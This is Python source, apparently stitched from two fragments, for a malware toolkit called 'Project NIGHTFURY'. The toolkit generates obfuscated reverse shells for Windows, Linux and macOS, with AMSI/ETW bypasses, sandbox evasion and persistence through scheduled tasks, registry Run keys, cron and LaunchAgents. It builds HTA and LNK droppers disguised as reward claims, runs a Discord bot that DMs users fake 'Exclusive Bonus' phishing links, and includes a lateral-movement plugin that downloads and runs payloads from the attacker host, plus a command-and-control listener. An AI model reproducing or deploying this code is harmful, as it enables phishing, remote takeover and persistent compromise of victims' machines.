                self, "Save LNK File", "Shortcut.lnk", "Shortcut Files (*.lnk)"
            )
            
            if filename:
                lnk_path = payload.generate_lnk(filename)
                self.current_payload = f"LNK file generated at: {lnk_path}"
                
                # Display LNK info
                self.payload_preview.setPlainText(self.current_payload)
                self.save_btn.setEnabled(False)  # Already saved
                self.copy_btn.setEnabled(False)
                self.test_btn.setEnabled(True)
                
                self.status_bar.showMessage("✅ LNK payload generated successfully", 3000)
                self.activity_list.addItem("[+] Generated LNK payload")
                
                # Update payload count
                current_count = int(self.payload_count.text())
                self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def save_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save Payload", "payload.ps1", "PowerShell Scripts (*.ps1);;All Files (*)"
            )
            
            if filename:
                with open(filename, "w") as f:
                    f.write(self.current_payload)
                self.status_bar.showMessage(f"✅ Payload saved to {filename}", 5000)
                self.activity_list.addItem(f"[+] Payload saved to {filename}")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def copy_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            clipboard = QApplication.clipboard()
            clipboard.setText(self.current_payload)
            self.status_bar.showMessage("✅ Payload copied to clipboard", 3000)
            self.activity_list.addItem("[+] Payload copied to clipboard")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_listener(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Please configure LHOST and LPORT first")
            
            # Create listener socket
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.config['lhost'], self.config['lport']))
            self.listener_socket.listen(5)
            
            # Start listener thread
            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
            self.listener_thread.start()
            
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.command_input.setEnabled(True)
            self.send_btn.setEnabled(True)
            self.connection_status.setText(f"🟢 Listening on {self.config['lhost']}:{self.config['lport']}")
            self.connection_status.setStyleSheet("color: green; font-weight: bold; font-size: 14px;")
            self.activity_list.addItem(f"[+] Listener started on {self.config['lhost']}:{self.config['lport']}")
            
            self.status_bar.showMessage("✅ Listener started", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Listener error: {str(e)}", 5000)
    
    def listen_for_connections(self):
        while True:
            try:
                client_socket, addr = self.listener_socket.accept()
                ip, port = addr
                
                # Add to active connections
                self.active_connections.append({
                    'socket': client_socket,
                    'address': f"{ip}:{port}",
                    'active': True
                })
                
                # Update UI
                self.activity_list.addItem(f"[+] New connection from {ip}:{port}")
                self.connections_list.addItem(f"{ip}:{port}")
                
                # Start client handler
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, f"{ip}:{port}"),
                    daemon=True
                )
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, client_id):
        try:
            # Send initial prompt
            if self.config['platform'] == "windows":
                client_socket.send(b"PS C:\\> ")
            else:
                client_socket.send(b"$ ")
            
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                try:
                    # Execute command
                    cmd = data.decode().strip()
                    if cmd.lower() == "exit":
                        break
                    
                    self.command_output.append(f"[{client_id}] > {cmd}")
                    
                    # Run command and capture output
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout + result.stderr
                    
                    if self.config['platform'] == "windows":
                        output += f"\nPS {os.getcwd()}> "
                    else:
                        output += f"\n$ "
                except Exception as e:
                    if self.config['platform'] == "windows":
                        output = f"Error: {str(e)}\nPS {os.getcwd()}> "
                    else:
                        output = f"Error: {str(e)}\n$ "
                
                client_socket.send(output.encode())
                self.command_output.append(f"[{client_id}] {output}")
        except:
            pass
        
        # Remove connection
        self.activity_list.addItem(f"[-] Connection closed: {client_id}")
        for i, conn in enumerate(self.active_connections):
            if conn['address'] == client_id:
                self.active_connections.pop(i)
                break
        
        # Remove from UI
        items = self.connections_list.findItems(client_id, Qt.MatchExactly)
        for item in items:
            row = self.connections_list.row(item)
            self.connections_list.takeItem(row)
        
        client_socket.close()
    
    def stop_listener(self):
        try:
            # Close all client sockets
            for conn in self.active_connections:
                try:
                    conn['socket'].close()
                except:
                    pass
            
            # Close listener socket
            self.listener_socket.close()
            self.active_connections = []
            
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.command_input.setEnabled(False)
            self.send_btn.setEnabled(False)
            self.connection_status.setText("🔴 Listener stopped")
            self.connection_status.setStyleSheet("color: red; font-weight: bold; font-size: 14px;")
            self.activity_list.addItem("[+] Listener stopped")
            
            # Clear connections list
            self.connections_list.clear()
            
            self.status_bar.showMessage("✅ Listener stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping listener: {str(e)}", 5000)
    
    def send_command(self):
        try:
            command = self.command_input.text().strip()
            if not command:
                return
            
            # Get selected connection
            selected_items = self.connections_list.selectedItems()
            if not selected_items:
                raise Exception("Select a connection first")
            
            client_id = selected_items[0].text()
            
            # Find client socket
            for conn in self.active_connections:
                if conn['address'] == client_id:
                    conn['socket'].send(f"{command}\n".encode())
                    self.command_output.append(f"[{client_id}] > {command}")
                    self.command_input.clear()
                    return
            
            raise Exception("Connection not found")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_auto_server(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Configure LHOST and LPORT first")
            
            # Create HTTP server with custom parameters
            server_address = ('', self.config['auto_server_port'])
            
            # Create a custom handler class with our config
            class CustomHandler(AutoExecutionServer):
                pass
                
            setattr(CustomHandler, 'server', self)
            setattr(CustomHandler, 'lhost', self.config['lhost'])
            setattr(CustomHandler, 'lport', self.config['lport'])
            setattr(CustomHandler, 'obfuscation_level', self.config['obfuscation_level'])
            setattr(CustomHandler, 'persistence', self.config['persistence'])
            setattr(CustomHandler, 'evasion_techniques', self.config['evasion_techniques'])
            setattr(CustomHandler, 'platform', self.config['platform'])
            setattr(CustomHandler, 'domain', self.config['domain'])
            
            self.http_server = HTTPServer(server_address, CustomHandler)
            self.http_server.is_running = True
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            server_thread.start()
            
            self.start_server_btn.setEnabled(False)
            self.stop_server_btn.setEnabled(True)
            
            # Generate claim URL
            claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/"
            self.server_url.setText(claim_url)
            
            # Generate QR code
            qr = qrcode.QRCode()
            qr.add_data(claim_url)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            # Convert to QPixmap
            img_byte_arr = io.BytesIO()
            qr_img.save(img_byte_arr, format='PNG')
            qpixmap = QPixmap()
            qpixmap.loadFromData(img_byte_arr.getvalue())
            self.qr_label.setPixmap(qpixmap)
            
            self.activity_list.addItem(f"[+] Auto-server started: {claim_url}")
            self.server_status.setText("Running")
            self.server_status.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
            self.status_bar.showMessage(f"✅ Auto-server started on port {self.config['auto_server_port']}", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Server error: {str(e)}", 5000)
    
    def stop_auto_server(self):
        try:
            if self.http_server:
                self.http_server.shutdown()
                self.http_server.server_close()
                
                self.start_server_btn.setEnabled(True)
                self.stop_server_btn.setEnabled(False)
                self.server_url.clear()
                self.qr_label.clear()
                
                self.activity_list.addItem("[+] Auto-server stopped")
                self.server_status.setText("Stopped")
                self.server_status.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
                self.status_bar.showMessage("✅ Auto-server stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping server: {str(e)}", 5000)
    
    def copy_claim_url(self):
        try:
            if self.server_url.text():
                clipboard = QApplication.clipboard()
                clipboard.setText(self.server_url.text())
                self.status_bar.showMessage("✅ Claim URL copied to clipboard", 3000)
                self.activity_list.addItem("[+] Claim URL copied to clipboard")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_discord_bot(self):
        try:
            self.save_config()
            
            if not self.config['discord_token']:
                raise Exception("Enter Discord token")
            
            # Create and start Discord bot
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.discord_bot = commands.Bot(
                command_prefix='!',
                intents=intents
            )
            
            @self.discord_bot.event
            async def on_ready():
                self.bot_status.setText("Bot status: ✅ Connected")
                self.bot_status_dash.setText("Running")
                self.bot_status_dash.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
                self.activity_list.addItem("[+] Discord bot connected")
            
            @self.discord_bot.command()
            async def claim(ctx):
                # Generate a unique claim token
                claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/?token={claim_token}"
                
                # Create embed message
                embed = discord.Embed(
                    title="🎁 Exclusive Bonus Claim",
                    description="You've been selected for a special reward!",
                    color=0x00ff00
                )
                embed.add_field(
                    name="Claim Instructions",
                    value=f"Click [here]({claim_url}) to claim your bonus immediately!",
                    inline=False
                )
                embed.add_field(
                    name="Important",
                    value="This offer expires in 10 minutes. Claim now before it's gone!",
                    inline=False
                )
                embed.set_footer(text="Reward Center - Official Distribution")
                
                try:
                    await ctx.author.send(embed=embed)
                    await ctx.send(f"{ctx.author.mention}, check your DMs for your exclusive bonus claim!")
                    self.activity_list.addItem(f"[+] Sent bonus claim to {ctx.author}")
                except discord.Forbidden:
                    await ctx.send(f"{ctx.author.mention}, I couldn't DM you. Please enable DMs!")
            
            # Start bot in a separate thread
            bot_thread = threading.Thread(target=self.discord_bot.run, args=(self.config['discord_token'],), daemon=True)
            bot_thread.start()
            
            self.start_bot_btn.setEnabled(False)
            self.stop_bot_btn.setEnabled(True)
            self.bot_status.setText("Bot status: ⚡ Starting...")
            
            self.status_bar.showMessage("✅ Discord bot started. Use '!claim' in Discord", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Bot error: {str(e)}", 5000)
    
    def stop_discord_bot(self):
        try:
            if self.discord_bot:
                asyncio.run(self.discord_bot.close())
                
                self.start_bot_btn.setEnabled(True)
                self.stop_bot_btn.setEnabled(False)
                self.bot_status.setText("Bot status: 🔴 Stopped")
                self.bot_status_dash.setText("Stopped")
                self.bot_status_dash.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
                
                self.activity_list.addItem("[+] Discord bot stopped")
                self.status_bar.showMessage("✅ Discord bot stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping bot: {str(e)}", 5000)
    
    def update_connection_status(self):
        # Update connection count in status bar
        connection_count = len(self.active_connections)
        self.conn_count.setText(str(connection_count))
        
        # Update connection graph
        self.connection_graph.add_data_point(connection_count)
        
        status = f"✅ System Ready | Connections: {connection_count}"
        if hasattr(self, 'http_server') and self.http_server and self.http_server.is_running:
            status += " | Server: Running"
        if self.discord_bot:
            status += " | Bot: Running"
        self.status_bar.showMessage(status)
    
    def update_stats(self):
        # Update connection stats
        self.connection_stats.append(len(self.active_connections))
        if len(self.connection_stats) > 50:
            self.connection_stats.pop(0)
    
    def show_settings(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Settings")
        dialog.setModal(True)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout()
        
        # Theme selection
        theme_group = QGroupBox("Theme")
        theme_layout = QVBoxLayout()
        
        theme_combo = QComboBox()
        theme_combo.addItems(["Dark", "Light", "System"])
        theme_layout.addWidget(theme_combo)
        
        theme_group.setLayout(theme_layout)
        layout.addWidget(theme_group)
        
        # Logging settings
        log_group = QGroupBox("Logging")
        log_layout = QVBoxLayout()
        
        log_level = QComboBox()
        log_level.addItems(["Debug", "Info", "Warning", "Error"])
        log_layout.addWidget(QLabel("Log Level:"))
        log_layout.addWidget(log_level)
        
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.activity_list.addItem("[*] Settings updated")
            QMessageBox.information(self, "Settings", "Settings updated successfully")

# ==============================
# PLUGIN IMPLEMENTATIONS
# ==============================

class AVEvasionPlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "AV Evasion"
        self.version = "1.0"
        self.description = "Advanced AV evasion techniques including code obfuscation and sandbox detection"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] AV Evasion plugin initialized")
    
    def execute(self, payload):
        # Apply additional AV evasion techniques
        evasion_payload = self._apply_evasion(payload)
        return evasion_payload
    
    def _apply_evasion(self, payload):
        # Add sandbox detection
        sandbox_detection = '''
        # Sandbox detection
        $isSandbox = $false
        if (Get-WmiObject -Class Win32_ComputerSystem | Where-Object { $_.Model -like "*Virtual*" }) { $isSandbox = $true }
        if (Get-WmiObject -Class Win32_BIOS | Where-Object { $_.SerialNumber -like "*VMware*" }) { $isSandbox = $true }
        if (($env:USERNAME).ToLower() -eq "sandbox") { $isSandbox = $true }
        
        if (-not $isSandbox) {
            # Continue with payload
        '''
        
        # Add the sandbox detection to the payload
        if "windows" in payload.lower():
            payload = sandbox_detection + payload + "\n}"
        
        return payload

class PersistencePlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "Persistence"
        self.version = "1.0"
        self.description = "Advanced persistence mechanisms including scheduled tasks, registry modifications, and service creation"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] Persistence plugin initialized")
    
    def execute(self, payload):
        # Apply additional persistence techniques
        persistent_payload = self._apply_persistence(payload)
        return persistent_payload
    
    def _apply_persistence(self, payload):
        # Add additional persistence mechanisms
        extra_persistence = '''
        # Registry persistence
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $regName = "SystemHealthCheck"
        $regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + $payload + "\\""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        # Service persistence
        $serviceName = "SystemHealthService"
        if (-not (Get-Service $serviceName -ErrorAction SilentlyContinue)) {
            New-Service -Name $serviceName -BinaryPathName $regValue -Description "System Health Monitoring Service" -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service $serviceName -ErrorAction SilentlyContinue
        }
        '''
        
        # Add the extra persistence to the payload
        if "windows" in payload.lower():
            payload = payload + extra_persistence
        
        return payload

class LateralMovementPlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "Lateral Movement"
        self.version = "1.0"
        self.description = "Lateral movement techniques including WMI, PSExec, and PowerShell Remoting"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] Lateral Movement plugin initialized")
    
    def execute(self, target):
        # Attempt lateral movement to target
        return self._lateral_move(target)
    
    def _lateral_move(self, target):
        # Implement lateral movement techniques
        movement_script = f'''
        # Attempt lateral movement to {target}
        try {{
            # WMI execution
            $cred = Get-Credential
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ExecutionPolicy Bypass -Command \\"IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')\\""
            
            # PowerShell Remoting
            Invoke-Command -ComputerName {target} -ScriptBlock {{ 
                IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')
            }} -Credential $cred
            
            return "Lateral movement attempted to {target}"
        }}
        catch {{
            return "Lateral movement failed: $($_.Exception.Message)"
        }}
        '''
        
        return movement_script

# ==============
# MAIN EXECUTION
# ==============

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set application font
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = NightfuryGUI()
    window.show()
    sys.exit(app.exec_())



#!/usr/bin/env python3
"""
Project NIGHTFURY - Advanced Auto-Execute Payload System
Author: Cyber Sentinel
Version: 5.0 - OWASP Enhanced Edition
Description: Advanced payload framework with multi-platform support and enhanced evasion
"""

import os
import sys
import base64
import random
import string
import socket
import threading
import time
import requests
import json
import discord
from discord.ext import commands
import asyncio
import subprocess
import uuid
import re
import logging
import qrcode
import io
import platform
import sqlite3
import datetime
import tempfile
import zipfile
import shutil
from cryptography.fernet import Fernet
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QSplitter, QFormLayout, QSizePolicy, QStatusBar, QStackedWidget,
    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
    QDockWidget, QMenu, QAction, QSystemTrayIcon, QToolBar, QToolButton, QDialog,
    QInputDialog, QListView, QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox,
    QSlider, QProgressDialog, QDialogButtonBox, QFrame, QGridLayout
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QPoint, QRect, QUrl
from PyQt5.QtGui import (QFont, QPalette, QColor, QIcon, QPixmap, QImage, QDesktopServices, 
                         QPainter, QLinearGradient, QBrush, QPen, QPainterPath, QMouseEvent)
from PyQt5.QtChart import QChart, QChartView, QPieSeries, QBarSet, QBarSeries, QValueAxis, QBarCategoryAxis

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# PLUGIN SYSTEM
# ==============================

class Plugin:
    """Base class for all plugins"""
    def __init__(self, core):
        self.core = core
        self.name = "Unnamed Plugin"
        self.version = "1.0"
        self.description = "No description"
        
    def initialize(self):
        """Initialize the plugin"""
        pass
        
    def execute(self, *args, **kwargs):
        """Execute plugin functionality"""
        pass

class PluginManager:
    """Manages plugin loading and execution"""
    def __init__(self):
        self.plugins = {}
        self.loaded_plugins = {}
        
    def register_plugin(self, name, plugin_class):
        """Register a plugin class"""
        self.plugins[name] = plugin_class
        
    def load_plugin(self, name, core):
        """Load a plugin instance"""
        if name in self.plugins:
            plugin = self.plugins[name](core)
            plugin.initialize()
            self.loaded_plugins[name] = plugin
            return plugin
        return None
        
    def get_plugin(self, name):
        """Get a loaded plugin"""
        return self.loaded_plugins.get(name)
        
    def list_plugins(self):
        """List all available plugins"""
        return list(self.plugins.keys())

# ==============================
# CORE PAYLOAD GENERATION ENGINE
# ==============================

class NightfuryPayload:
    def __init__(self, lhost, lport, obfuscation_level=5, persistence=True, 
                 evasion_techniques=True, platform="windows", payload_type="reverse_shell"):
        self.lhost = lhost
        self.lport = lport
        self.obfuscation_level = obfuscation_level
        self.persistence = persistence
        self.evasion_techniques = evasion_techniques
        self.platform = platform
        self.payload_type = payload_type
        self.payload = None
        self.payload_id = str(uuid.uuid4())[:8]
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
    
    def _generate_key(self, length=32):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _xor_encrypt(self, payload):
        key = self._generate_key()
        encrypted = bytearray()
        for i in range(len(payload)):
            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
        return base64.b64encode(encrypted).decode(), key
    
    def _aes_encrypt(self, payload):
        encrypted = self.fernet.encrypt(payload)
        return base64.b64encode(encrypted).decode()
    
    def _add_amsi_bypass(self, payload):
        bypass_code = '''
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null, @{});
        '''
        return bypass_code + payload
    
    def _add_etw_bypass(self, payload):
        etw_bypass = '''
        $etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
        $etwProvider.GetField('etwProvider','NonPublic,Static').SetValue($null, $null);
        '''
        return etw_bypass + payload
    
    def _add_sleep_obfuscation(self, payload):
        sleep_obfuscation = '''
        function Invoke-SleepObfuscation {
            param($Seconds)
            $start = Get-Date
            while ((Get-Date) - $start).TotalSeconds -lt $Seconds) {
                $dummy = 1..1000 | ForEach-Object { [math]::Sin($_) }
            }
        }
        '''
        return sleep_obfuscation + payload.replace('Start-Sleep', 'Invoke-SleepObfuscation')
    
    def _add_api_unhooking(self, payload):
        api_unhooking = '''
        function Invoke-APIUnhooking {
            $kernel32 = Add-Type -Name 'Kernel32' -Namespace 'Win32' -MemberDefinition '
                [DllImport("kernel32.dll")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
                
                [DllImport("kernel32.dll")]
                public static extern IntPtr LoadLibrary(string lpFileName);
                
                [DllImport("kernel32.dll")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            ' -PassThru
            
            # TODO: Implement actual API unhooking logic
            Write-Host "API Unhooking placeholder"
        }
        Invoke-APIUnhooking
        '''
        return api_unhooking + payload
    
    def _add_persistence(self, payload):
        if self.platform == "windows":
            persistence_code = f'''
            $taskName = "SystemHealthCheck_{self.payload_id}";
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{payload}`"";
            $trigger = New-ScheduledTaskTrigger -AtLogOn;
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive;
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew;
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null;
            '''
        elif self.platform == "linux":
            persistence_code = f'''
            echo '{payload}' > /etc/cron.hourly/system-health-check
            chmod +x /etc/cron.hourly/system-health-check
            '''
        else:  # macOS
            persistence_code = f'''
            echo '{payload}' > ~/Library/LaunchAgents/com.system.healthcheck.plist
            launchctl load ~/Library/LaunchAgents/com.system.healthcheck.plist
            '''
        
        return persistence_code
    
    def _obfuscate_vars(self, payload):
        # Replace common variable names with random strings
        var_map = {
            'c': self._generate_key(6),
            's': self._generate_key(6),
            'b': self._generate_key(6),
            'i': self._generate_key(6),
            'd': self._generate_key(6),
            'sb': self._generate_key(6),
            'sb2': self._generate_key(6),
            'bt': self._generate_key(6)
        }
        
        for orig, new in var_map.items():
            payload = payload.replace(f'${orig}', f'${new}')
        
        return payload
    
    def _insert_junk_code(self, payload):
        # Insert random comments and junk operations
        junk_ops = [
            "Start-Sleep -Milliseconds 10;",
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;",
            "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');",
            "$junkVar = [System.Guid]::NewGuid().ToString();",
            "if ($true) { $null = 1 + 1 };",
            "for ($i=0; $i -lt 1; $i++) { $null = $i };",
            "try { $null = Get-Date } catch {};"
        ]
        
        lines = payload.split(';')
        new_lines = []
        for line in lines:
            if line.strip() and random.random() > 0.7:
                junk = random.choice(junk_ops)
                new_lines.append(junk)
            new_lines.append(line)
        
        return ';'.join(new_lines)
    
    def _generate_windows_payload(self):
        # Base PowerShell reverse shell with enhanced obfuscation
        ps_code = f'''
        $c = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
            $sb = (iex $d 2>&1 | Out-String );
            $sb2 = $sb + "PS " + (pwd).Path + "> ";
            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
            $s.Write($sbt,0,$sbt.Length);
            $s.Flush()
        }}
        $c.Close()
        '''
        
        # Add evasion techniques
        if self.evasion_techniques:
            ps_code = self._add_amsi_bypass(ps_code)
            ps_code = self._add_etw_bypass(ps_code)
            ps_code = self._add_sleep_obfuscation(ps_code)
            ps_code = self._add_api_unhooking(ps_code)
        
        # Apply obfuscation layers
        for _ in range(self.obfuscation_level):
            encrypted, key = self._xor_encrypt(ps_code.encode())
            ps_code = f'''
            $k = "{key}";
            $s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{encrypted}"));
            $r = '';
            0..($s.Length-1)|%{{$r += [char]($s[$_] -bxor $k[$_ % $k.Length])}};
            iex $r
            '''
            # Randomize variable names
            ps_code = self._obfuscate_vars(ps_code)
            # Insert junk code
            ps_code = self._insert_junk_code(ps_code)
        
        # Add persistence if requested
        if self.persistence:
            ps_code = self._add_persistence(ps_code)
        
        return ps_code
    
    def _generate_linux_payload(self):
        # Linux bash reverse shell
        bash_code = f'''#!/bin/bash
        while true; do
            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1 2>/dev/null
            sleep 30
        done
        '''
        
        # Add persistence if requested
        if self.persistence:
            bash_code += f'''
            # Add to crontab for persistence
            (crontab -l 2>/dev/null; echo "@reboot sleep 60 && {bash_code}") | crontab -
            '''
        
        return bash_code
    
    def _generate_macos_payload(self):
        # macOS reverse shell (bash or python)
        macos_code = f'''#!/bin/bash
        # Check if we have python
        if command -v python3 &> /dev/null; then
            python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
        else
            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
        fi
        '''
        
        # Add persistence if requested
        if self.persistence:
            macos_code += f'''
            # Create launch agent for persistence
            cat > ~/Library/LaunchAgents/com.system.update.plist << EOF
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.system.update</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/bin/bash</string>
                    <string>-c</string>
                    <string>{macos_code}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            EOF
            launchctl load ~/Library/LaunchAgents/com.system.update.plist
            '''
        
        return macos_code
    
    def generate(self):
        # Generate platform-specific payload
        if self.platform == "windows":
            ps_code = self._generate_windows_payload()
            self.payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code}\""
        elif self.platform == "linux":
            self.payload = self._generate_linux_payload()
        elif self.platform == "macos":
            self.payload = self._generate_macos_payload()
        else:
            raise ValueError(f"Unsupported platform: {self.platform}")
        
        return self.payload
    
    def generate_hta(self):
        if not self.payload:
            self.generate()
        
        # Create HTA file that auto-executes the payload
        hta_content = f"""
        <html>
        <head>
        <title>Reward Claim Center</title>
        <HTA:APPLICATION ID="RewardClaim" APPLICATIONNAME="Reward Claim" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
        <script language="VBScript">
            Sub Window_OnLoad
                On Error Resume Next
                Set objShell = CreateObject("Wscript.Shell")
                objShell.Run "{self.payload.replace('"', '""')}", 0, False
                Self.Close
            End Sub
        </script>
        </head>
        <body>
        <div style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>Processing Your Reward...</h1>
            <p>Please wait while we verify and apply your bonus.</p>
        </div>
        </body>
        </html>
        """
        return hta_content
    
    def generate_lnk(self, output_path):
        """Generate a LNK file that executes the payload"""
        if not self.payload:
            self.generate()
        
        # Create a VBS script that will be called by the LNK file
        vbs_content = f'''
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run "{self.payload}", 0, False
        Set WshShell = Nothing
        '''
        
        vbs_path = os.path.join(tempfile.gettempdir(), f"system_update_{random.randint(1000, 9999)}.vbs")
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        
        # Create LNK file
        lnk_content = f'''
        [InternetShortcut]
        URL=file:///{vbs_path.replace(os.sep, '/')}
        IconIndex=0
        HotKey=0
        IconFile=C:\\Windows\\System32\\shell32.dll
        '''
        
        with open(output_path, 'w') as f:
            f.write(lnk_content)
        
        return output_path

# ========================
# AUTO-EXECUTION ENGINES
# ========================

class AutoExecutionServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Check for trigger parameter
        if parsed_path.path == "/claim":
            # Send auto-execute HTA file
            self.send_response(200)
            self.send_header('Content-Type', 'application/hta')
            self.send_header('Content-Disposition', 'attachment; filename="reward_claim.hta"')
            self.end_headers()
            
            # Generate HTA payload
            payload = NightfuryPayload(
                self.server.lhost, 
                self.server.lport,
                self.server.obfuscation_level,
                self.server.persistence,
                self.server.evasion_techniques,
                self.server.platform
            )
            hta_content = payload.generate_hta()
